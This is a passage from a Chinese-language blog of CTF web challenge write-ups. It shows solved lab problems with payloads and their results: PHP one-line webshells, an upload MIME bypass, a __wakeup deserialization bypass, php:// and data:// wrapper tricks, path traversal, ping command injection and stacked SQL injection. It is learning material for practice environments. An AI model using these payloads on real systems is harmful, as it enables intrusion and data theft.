upload.php</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;露出马脚，直接cat看一看，发现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行命令：cat /app/flag.php</span><br><span class="line">&lt;?php @eval(system(&quot;cat /app/flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/423_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="423_结果展示"></p><h2 id="3865-LitCTF-2023-PHP是世界上最好的语言！！"><a href="#3865-LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="3865_[LitCTF 2023]PHP是世界上最好的语言！！"></a>3865_[LitCTF 2023]PHP是世界上最好的语言！！</h2><p>&emsp;&emsp;进入环境，根据题目提示，先一句话试试水：<code>&lt;?php @eval(system(&quot;cat /flag&quot;);?&gt;</code>，直接给出结果</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3865_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3865_结果展示"></p><h2 id="388-SWPUCTF-2021-新生赛-easyupload1-0-–文件上传-–phpinfo-直出-–MIME绕过"><a href="#388-SWPUCTF-2021-新生赛-easyupload1-0-–文件上传-–phpinfo-直出-–MIME绕过" class="headerlink" title="388_[SWPUCTF 2021 新生赛]easyupload1.0 –文件上传 –phpinfo()直出 –MIME绕过"></a>388_[SWPUCTF 2021 新生赛]easyupload1.0 –文件上传 –phpinfo()直出 –MIME绕过</h2><p>&emsp;&emsp;进入环境，根据题目判断为文件上传问题，先尝试构建一个一句话木马试试水</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(system(&quot;pwd&quot;);?&gt;             #返回：想啥呢</span><br><span class="line"># 修改文件后缀为.phtml，无变化</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里只能看出来是代码存在一定防护机制，但看不出来针对于哪个地方；没办法，上网搜一下一般监测点</p><table><thead><tr><th align="center">监测点</th><th align="center">绕过</th></tr></thead><tbody><tr><td align="center">Content-Type</td><td align="center">文件类型绕过</td></tr><tr><td align="center">filename</td><td align="center">文件头、文件后缀名绕过</td></tr><tr><td align="center">文件内容</td><td align="center">指定字符、指定格式绕过</td></tr></tbody></table><p>&emsp;&emsp;一个个尝试下，首先是Content-Type，由于题中页面给出信息“upload1.jpg”，所以将Content-Type改为图片对应值，出现新的变动</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/388_CT%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C.png" title="388_CT修改结果"></p><p>&emsp;&emsp;接下来老套路了，先理清目录结构 &#x3D;&gt; 找到马脚 &#x3D;&gt; 手拿把掐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 运行：pwd</span><br><span class="line">&lt;?php @eval(system(&quot;pwd&quot;);?&gt;                     # 返回：/app/upload</span><br><span class="line"># 运行：ls /app</span><br><span class="line">&lt;?php @eval (system(&quot;ls /app&quot;));?&gt;               # 返回：flag.php index.php upload upload.php</span><br><span class="line"># 运行：cat ../flag.php</span><br><span class="line">&lt;?php @eval (system(&quot;cat ../flag.php&quot;));?&gt;       </span><br><span class="line"># 返回：</span><br><span class="line">&lt;?php </span><br><span class="line">$flag = &#x27;WLLMCTF&#123;I_d0nt_w4nna_wak3up&#125;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;惊吓吗，flag是错的，继续找吧；这里在找资料时发现一句新的代码：<code>&lt;?php phpinfo();?&gt;</code>，据说好用，走走看</p><p>&emsp;&emsp;真好用&gt; . &lt;，下为结算画面</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/388_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="388_结果展示"></p><h2 id="3863-LitCTF-2023-导弹迷踪-–不知道怎么评价"><a href="#3863-LitCTF-2023-导弹迷踪-–不知道怎么评价" class="headerlink" title="3863_[LitCTF 2023]导弹迷踪 –不知道怎么评价"></a>3863_[LitCTF 2023]导弹迷踪 –不知道怎么评价</h2><p>&emsp;&emsp;进入环境，好消息，有游戏玩；坏消息，在戏耍你</p><p>&emsp;&emsp;我天生不爱游戏，选择一点点搜着看JS源代码，f、l、a、g都看了遍T _ TT _ T，没结果，还有几个.js文件，接着看</p><p>&emsp;&emsp;在&#x2F;src&#x2F;game.js可以找到，给出如下</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3863_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3863_结果展示"></p><h2 id="429-SWPUCTF-2021-新生赛-no-wakeup-–反序列化-–魔术方法绕过-–-wakeup-绕过"><a href="#429-SWPUCTF-2021-新生赛-no-wakeup-–反序列化-–魔术方法绕过-–-wakeup-绕过" class="headerlink" title="429_[SWPUCTF 2021 新生赛]no_wakeup –反序列化 –魔术方法绕过 –__wakeup()绕过"></a>429_[SWPUCTF 2021 新生赛]no_wakeup –反序列化 –魔术方法绕过 –<code>__wakeup()</code>绕过</h2><p>&emsp;&emsp;进入环境，点击获得PHP代码，和426一模一样，只有类名和passwd更改了，直接套用：<code>O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code>，得到结果</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/429_%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C.png" title="429_加密结果"></p><p>&emsp;&emsp;好吧其实不太一样，注意其中<code>$this-&gt;passwd = sha1($this-&gt;passwd);</code>，passwd经过了一次加密，这里先介绍反序列化的魔术方法</p><table><thead><tr><th align="center">魔术方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>serialize()</code></td><td align="center">将对象转换成字符串</td></tr><tr><td align="center"><code>unserialize()</code></td><td align="center">将字符串还原成一个对象，触发条件：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法</td></tr><tr><td align="center"><code>__toString()</code></td><td align="center">在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</td></tr><tr><td align="center"><code>__construct()</code></td><td align="center">创建对象时触发</td></tr><tr><td align="center"><code>__destruct()</code></td><td align="center">对象被销毁时触发</td></tr><tr><td align="center"><code>__wakeup()</code></td><td align="center">unserialize()时，会检查是否存在一个__wakeup()魔术方法。存在，则该方法会先被调用</td></tr><tr><td align="center"><code>__call()</code></td><td align="center">在对象上下文中调用不可访问的方法时触发</td></tr><tr><td align="center"><code>__invoke()</code></td><td align="center">在脚本尝试将对象调用为函数时触发</td></tr><tr><td align="center"><code>__callStatic</code></td><td align="center">在静态上下文中调用不可访问的方法时触发</td></tr><tr><td align="center"><code>__get</code></td><td align="center">用于从不可访问的属性读取数据</td></tr><tr><td align="center"><code>__set</code></td><td align="center">用于将数据写入不可访问的属性</td></tr><tr><td align="center"><code>__isset()</code></td><td align="center">在不可访问的属性上调用isset()或empty()时触发</td></tr><tr><td align="center"><code>__unset()</code></td><td align="center">在不可访问的属性上使用unset()时触发</td></tr></tbody></table><p>&emsp;&emsp;此题学习其中第六个方法的绕过，网上查阅得知：针对<code>__wakeup()</code>方法有一个CVE漏洞，CVE-2016-7124</p><p>&emsp;&emsp;<span style="background-color: yellow;"><strong>CVE-2016-7124</strong></span>：当反序列化一个包含特定属性的对象时，如果对象的属性数量在序列化字符串中被错误地指定（即大于或小于对象实际具有的属性数量），那么PHP可能会跳过<code>__wakeup()</code>魔术方法的执行</p><p>&emsp;&emsp;于是修改一下：<code>O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code>，出现flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/429_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="429_结果展示"></p><h2 id="441-SWPUCTF-2021-新生赛-PseudoProtocols-–PHP伪协议-–file-get-contents-–文件包含漏洞-–data-text-plain伪协议"><a href="#441-SWPUCTF-2021-新生赛-PseudoProtocols-–PHP伪协议-–file-get-contents-–文件包含漏洞-–data-text-plain伪协议" class="headerlink" title="441_[SWPUCTF 2021 新生赛]PseudoProtocols –PHP伪协议 –file_get_contents() –文件包含漏洞 –data:&#x2F;&#x2F;text&#x2F;plain伪协议"></a>441_[SWPUCTF 2021 新生赛]PseudoProtocols –PHP伪协议 –file_get_contents() –文件包含漏洞 –data:&#x2F;&#x2F;text&#x2F;plain伪协议</h2><p>&emsp;&emsp;进入环境，根据提示，有hint.php需要找到，但直接输入该文件却不显示</p><p>&emsp;&emsp;注意到上方URL地址处自动带了一个变量&#x3D;，联想到构造PHP伪协议读取文件，同427</p><p>&emsp;&emsp;于是，构造<code>wllm=php://filter/read=convert.base64-encode/resource=hint.php</code>，得到Base64编码后的提示</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/441_Base64%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C.png" title="441_Base64加密结果"></p><p>&emsp;&emsp;进入提示.php文件，得到PHP代码，审计发现函数file_get_contents()不认识，学吧</p><p>&emsp;&emsp;<strong>string file_get_contents ( string filename [, bool use_include_path &#x3D; false [, resource context &#x3D; NULL [, int offset &#x3D; 0 [, int $maxlen &#x3D; NULL ]]]] )</strong></p><table><thead><tr><th align="center">参数名称</th><th align="center">是否必需</th><th align="center">描述</th><th align="center">默认值</th></tr></thead><tbody><tr><td align="center">$filename</td><td align="center">是</td><td align="center">要读取的文件或 URL</td><td align="center">无</td></tr><tr><td align="center">$use_include_path</td><td align="center">否</td><td align="center">如为 <code>true</code>，则 PHP 会在 <code>include_path</code> 中查找文件。</td><td align="center">false</td></tr><tr><td align="center">$context</td><td align="center">否</td><td align="center">指定上下文资源，可以修改文件流的行为</td><td align="center">NULL</td></tr><tr><td align="center">$offset</td><td align="center">否</td><td align="center">从文件的哪个位置开始读取。</td><td align="center">0（即从文件开头开始）</td></tr><tr><td align="center">$maxlen</td><td align="center">否</td><td align="center">最多读取多少字节。</td><td align="center">NULL（即读取整个文件）</td></tr></tbody></table><p>&emsp;&emsp;奇怪的是，我并没有找到这里关于参数’r’的定义；不过这不影响做题，我们只需要让变量$a是一个文件，且文件内容为”I want flag”即可，于是构造PHP伪协议，不过我不会，又学</p><p>&emsp;&emsp;查阅得知，适用该魔术方法的伪协议为<code>data://text/plain</code>，学一下</p><p>&emsp;&emsp;<span style="background-color: yellow;"><strong>data:&#x2F;&#x2F;text&#x2F;plain</strong></span>：允许内联数据作为文件资源来使用，text&#x2F;plain为资源类型，后跟“,资源”</p><p>&emsp;&emsp;尝试构建PHP伪协议：<code>?a=data://text/plain,I want flag</code>，成功得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/441_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="441_结果展示"></p><h2 id="958-NCTF-2018-签到题"><a href="#958-NCTF-2018-签到题" class="headerlink" title="958_[NCTF 2018]签到题"></a>958_[NCTF 2018]签到题</h2><p>&emsp;&emsp;进入环境，发现是百度的界面，也不是给的贴图，是真的百度界面</p><p>&emsp;&emsp;分析JS源码，找flag关键字，没找到；curl抓包，被调戏；利用自己写的脚本遍历一下目录，露出马脚</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/958_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="958_目录扫描结果"></p><p>&emsp;&emsp;接着用curl抓包&#x2F;index.php，发现flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/958_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="958_结果展示"></p><h2 id="2011-NISACTF-2022-easyssrf-–PHP伪协议-–SSRF漏洞-–stristr"><a href="#2011-NISACTF-2022-easyssrf-–PHP伪协议-–SSRF漏洞-–stristr" class="headerlink" title="2011_[NISACTF 2022]easyssrf –PHP伪协议 –SSRF漏洞 –stristr()"></a>2011_[NISACTF 2022]easyssrf –PHP伪协议 –SSRF漏洞 –stristr()</h2><p>&emsp;&emsp;进入环境，被搞的一脸懵，回头看题名，选择先学SSRF是个啥，以下是询问文心一言的结果</p><table><thead><tr><th align="center"><strong>类别</strong></th><th><strong>内容</strong></th></tr></thead><tbody><tr><td align="center"><strong>定义与原理</strong></td><td>SSRF（Server-Side Request Forgery）允许攻击者构造请求，并由服务端发起请求，以访问或攻击内网无法从外网直接访问的系统或服务。其原理在于服务端提供了从其他服务器应用获取数据的功能，但并未对目标地址进行充分的过滤和限制。</td></tr><tr><td align="center"><strong>漏洞成因</strong></td><td>1. 服务端提供了从其他服务器应用获取数据的功能。<br>2. 服务端没有对目标地址进行过滤与限制。</td></tr><tr><td align="center"><strong>漏洞利用方式</strong></td><td>1. 端口扫描<br>2. 攻击内网应用<br>3. 指纹识别<br>4. 读取本地文件<br>5. DoS攻击</td></tr><tr><td align="center"><strong>常用URL伪协议</strong></td><td>1. file:&#x2F;&#x2F;<br>2. dict:&#x2F;&#x2F;<br>3. sftp:&#x2F;&#x2F;<br>4. ldap:&#x2F;&#x2F;<br>5. tftp:&#x2F;&#x2F;<br>6. gopher:&#x2F;&#x2F;</td></tr><tr><td align="center"><strong>防御措施</strong></td><td>1. 禁用不需要的协议，如file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F;等。<br>2. 设置URL白名单或限制内网IP访问。<br>3. 限制请求的端口为HTTP常用端口，如80、443等。<br>4. 过滤返回信息，避免泄露敏感信息。<br>5. 统一错误信息，防止攻击者根据错误信息判断远端服务器的端口状态。</td></tr></tbody></table><p>&emsp;&emsp;好，很符合我现在的困境，一个个试试看，首先是file:&#x2F;&#x2F;，随便给个试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file:///bin                 # 返回：害羞羞，试试其他路径？</span><br><span class="line">file:///secret              # 同上</span><br><span class="line">file:///flag                # 返回：都说了这里看不了flag。。但是可以看看提示文件：/fl4g</span><br><span class="line">file:///fl4g                # 返回：你应该看看除了index.php，是不是还有个ha1x1ux1u.php</span><br><span class="line">file:///fl4g/ha1x1ux1u.php  # 返回：害羞羞，试试其他路径？</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;到这里，出现线索没有用上的地方，直接在URL上访问这个文件</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2011_ha1x1ux1u%E4%BB%A3%E7%A0%81.png" title="2011_ha1x1ux1u代码"></p><p>&emsp;&emsp;行，这个函数又不认识，学</p><p>&emsp;&emsp;<strong>string stristr ( string haystack , mixed needle [, bool $before_needle &#x3D; FALSE ] )</strong>，用于在字符串中查找子字符串的首次出现，如果找到子字符串，则返回从该位置到字符串末尾的所有字符；如果没有找到，则返回 FALSE</p><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th><th><strong>类型</strong></th><th><strong>默认值</strong></th></tr></thead><tbody><tr><td>haystack</td><td>要搜索的字符串</td><td>string</td><td>必填</td></tr><tr><td>needle</td><td>要查找的子字符串，如果不是字符串则会被转换为整型并应用为字符的顺序码</td><td>mixed</td><td>必填</td></tr><tr><td>before_needle</td><td>如果设置为<code>TRUE</code>，则返回<code>needle</code>在<code>haystack</code>中出现之前的部分</td><td>bool</td><td>FALSE</td></tr></tbody></table><p>&emsp;&emsp;也就是说我的参数file中不能出现字串“file”，再加上结尾的file_get_contents()函数，直接让file参数找flag文件位置即可，找到即得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=flag                                # 无结果</span><br><span class="line">?file=../flag                             # 无结果</span><br><span class="line">?file=../../flag                          # 无结果</span><br><span class="line">?file=../../../flag                       # 无结果</span><br><span class="line">?file=../../../../flag                    # 来了</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2011_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2011_结果展示"></p><p>&emsp;&emsp;回头看了看佬们的WriteUp，发现了一种新的办法：<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2011_%E8%A7%A3%E6%B3%952.png" title="2011_解法2"></p><p>&emsp;&emsp;将Base64编码解码后，同样能得到flag</p><h2 id="3864-LitCTF-2023-Follow-me-and-hack-me"><a href="#3864-LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="3864_[LitCTF 2023]Follow me and hack me"></a>3864_[LitCTF 2023]Follow me and hack me</h2><p>&emsp;&emsp;进入环境，根据提示，用HackBar分别传入指定参数，得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3864_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3864_结果展示"></p><h2 id="3873-LitCTF-2023-Ping-–ping命令注入"><a href="#3873-LitCTF-2023-Ping-–ping命令注入" class="headerlink" title="3873_[LitCTF 2023]Ping –ping命令注入"></a>3873_[LitCTF 2023]Ping –ping命令注入</h2><p>&emsp;&emsp;进入环境，随便输入一个域名<code>www.baidu.com</code>，得到警告要求只能输入ip，查看网页源代码得到JS函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_ip</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> ip = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;command&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">let</span> re = <span class="regexp">/^(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)$/</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(re.<span class="title function_">test</span>(ip.<span class="title function_">trim</span>()))&#123;      <span class="comment">// ip.trim()将ip两端的空白符消除，re.test()测试ip是否满足a.b.c.d，0~255</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;没有思路就去看博客，发现ping指令存在命令注入漏洞：在无waf的情况下，可以直接在ping的ip后面利用<code>;</code>添加shell命令，试试看</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3873_%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%9D%E8%AF%95.png" title="3873_命令注入尝试"></p><p>&emsp;&emsp;接下来就好办了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls /                      # 返回：bin dev etc flag home lib ……</span><br><span class="line">127.0.0.1;cat /flag                 # 返回flag</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;结算画面</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3873_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3873_结果展示"></p><h2 id="713-BJDCTF-2020-easy-md5-–弱比较-–数组绕过-–md5-–MySQL特性"><a href="#713-BJDCTF-2020-easy-md5-–弱比较-–数组绕过-–md5-–MySQL特性" class="headerlink" title="713_[BJDCTF 2020]easy_md5 –弱比较 –数组绕过 –md5() –MySQL特性"></a>713_[BJDCTF 2020]easy_md5 –弱比较 –数组绕过 –md5() –MySQL特性</h2><p>&emsp;&emsp;进入环境，先输俩数进去，没反应，curl抓包试一试，出现提示</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/713_curl%E7%BB%93%E6%9E%9C.png" title="713_curl结果"></p><p>&emsp;&emsp;根据hint提示，猜想是SQL注入，后面的md5()函数带了个参数true，分析其意思</p><p>&emsp;&emsp;<strong>string md5 ( string str [, bool $raw_output &#x3D; FALSE ] )</strong></p><table><thead><tr><th align="center">参数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">$str</td><td align="center">需要计算哈希值的字符串</td></tr><tr><td align="center">$raw_output</td><td align="center">如果为true，则输出原始的二进制数据；如果为false，则输出十六进制数</td></tr></tbody></table><p>&emsp;&emsp;即需使<code>password=md5($pass, true)</code>为真，查阅得知MySQL有以下特性</p><p>&emsp;&emsp;<span style="background-color: yellow;"><strong>在MySQL里，用作布尔型判断时，以数字开头的字符串会被当做整型数</strong></span></p><p>&emsp;&emsp;故只需要构造<code>password=&#39;&#39;or&#39;1xxxxxxx&#39;</code>型字符即可，网上搜了一个：<strong>ffifdyop</strong>，输入，查看网页源代码，得到下一步提示</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/713_%E6%BA%90%E7%A0%81%E5%B1%95%E7%A4%BA.png" title="713_源码展示"></p><p>&emsp;&emsp;这就好办了，直接数组绕过传参，具体原理见386，得到下一步PHP代码</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/713_PHP%E4%BB%A3%E7%A0%81.png" title="713_PHP代码"></p><p>&emsp;&emsp;一样的操作，得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/713_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="713_结果展示"></p><h2 id="2074-NSSCTF-2022-Spring-Recruit-ezgame"><a href="#2074-NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="2074_[NSSCTF 2022 Spring Recruit]ezgame"></a>2074_[NSSCTF 2022 Spring Recruit]ezgame</h2><p>&emsp;&emsp;进入环境，直接找源码，不想被折磨，一共两个.js文件</p><p>&emsp;&emsp;还是玩了把，结束字段有“Your”，于是ctrl+F查找flag、Your，找到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2074_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2074_结果展示"></p><h2 id="19-suctf-2019-EasySQL-–SQL注入-–SQL注入类型-–堆叠注入"><a href="#19-suctf-2019-EasySQL-–SQL注入-–SQL注入类型-–堆叠注入" class="headerlink" title="19_[suctf 2019]EasySQL –SQL注入 –SQL注入类型 –堆叠注入"></a>19_[suctf 2019]EasySQL –SQL注入 –SQL注入类型 –堆叠注入</h2><p>&emsp;&emsp;进入环境，根据题目，显然是SQL注入知识点，可以先来系统性学一下SQL注入的类型</p><table><thead><tr><th align="center">类型</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">联合注入</td><td align="center">即使用”union select”语句，又分字符型与数字型注入</td></tr><tr><td align="center">布尔盲注</td><td align="center">Web的页面的仅仅会返回True和False，布尔盲注就是根据页面返回的True或者是False来得到数据库中的相关信息</td></tr><tr><td align="center">时间盲注</td><td align="center">利用sleep()或benchmark()等函数使程序睡眠，通过页面的响应时间长短来判断返回值是true还是false，从而猜解字段</td></tr><tr><td align="center">宽字注入</td><td align="center">\</td></tr><tr><td align="center">报错注入</td><td align="center">通过特殊函数错误使用并使其输出错误结果来获取信息</td></tr><tr><td align="center">堆叠注入</td><td align="center">MySQL的多语句查询格式，语句间使用分号隔开</td></tr><tr><td align="center">二次注入</td><td align="center">攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入</td></tr></tbody></table><p>&emsp;&emsp;根据解释，一一尝试，由于URL上并未显示参数，初步判定参数以POST方式上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1                                      # Array ( [0] =&gt; 1 )</span><br><span class="line">2-1                                    # Array ( [0] =&gt; 1 )</span><br><span class="line">1-1                                    # Array ( [0] =&gt; 0 )</span><br><span class="line">1&#x27; and 1=1                             # Nonono.</span><br><span class="line">1&#x27; and &#x27;1=1&#x27;                           # Nonono.</span><br><span class="line">1&#x27; union select 1 --+                  # Nonono.</span><br><span class="line">1&#x27; order by 1 --+                      # Nonono.</span><br><span class="line">admin                                  # 空</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;显然，由于没有给出报错、True、False等信息，且程序似乎将<code>&#39; ~~~ &#39;</code>格式的字串识别为注入字串；在不考虑存在黑名单字符检测的情况下，剩下堆叠注入和二次注入；根据刚学的堆叠注入，尝试<code>query=1; select 1,2,3</code>，得到反馈</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/19_%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%B0%9D%E8%AF%95.png" title="19_堆叠注入尝试"></p><p>&emsp;&emsp;也即该题为堆叠注入类型，可执行多条MySQL查询语句，反复尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">query=1; select 1,2,group_concat(schema_name) from information_schema.schemata --+     # Nonono.</span><br><span class="line">query=1; select 1,2,3,4,5           # 1,2,3,4,1</span><br><span class="line">query=1; show databases             # ctf, ctftraining information_schema mysql performance_schema test</span><br><span class="line">query=1; select schema_name from from information_schema.schemata          # Nonono.</span><br><span class="line">query=1; select 1,2,3 from from information_schema.schemata                # Nonono.</span><br><span class="line"># 还是要从1,2,3,4,1的回复来突破</span><br><span class="line">query=1; select 2,3,4,5,6           # 2,3,4,5,1</span><br><span class="line">query=1; select 2,3,4,5,6543        # 2,3,4,5,1</span><br><span class="line">query=1; select 2,3,4,5,0           # 2,3,4,5,0</span><br><span class="line">query=1; select 2,3,4,5,*           # 空</span><br><span class="line"># 也就是说，程序中必定存在一个判断机制，若最后一个数为false，返回0</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据所测试的样例及返回的结果，程序应当是对select的参数进行检测：对k个参数检测，如果非合法输入，则不返回或No；对最后一个参数进行更严格的检测，只要非数字，即不返回或No，对数字进行true和false的判断，故可以尝试将通配符*置于前k-1个参数位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query=1; select 2,3,4,5,*           # 空</span><br><span class="line">query=1; select 2,3,4,*,6           # 空</span><br><span class="line">query=1; select 2,3,*,5,6           # 空</span><br><span class="line">query=1; select 2,*,4,5,6           # 空</span><br><span class="line">query=1; select *,3,4,5,6           # 出现flag</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;看来前面的猜测还有点错，不过不影响我们解出答案╮( ˘ ､ ˘ )╭</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/19_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="19_结果展示"></p><h2 id="22-ZJCTF-2019-NiZhuanSiWei-–PHP伪协议-–file-get-contents-–反序列化-–preg-match-–有问题尚未解决"><a href="#22-ZJCTF-2019-NiZhuanSiWei-–PHP伪协议-–file-get-contents-–反序列化-–preg-match-–有问题尚未解决" class="headerlink" title="22_[ZJCTF 2019]NiZhuanSiWei –PHP伪协议 –file_get_contents() –反序列化 –preg_match() –有问题尚未解决"></a>22_[ZJCTF 2019]NiZhuanSiWei –PHP伪协议 –file_get_contents() –反序列化 –preg_match() –有问题尚未解决</h2><p>&emsp;&emsp;进入环境得到PHP代码(好久没遇到这么单纯的题了)，审计代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 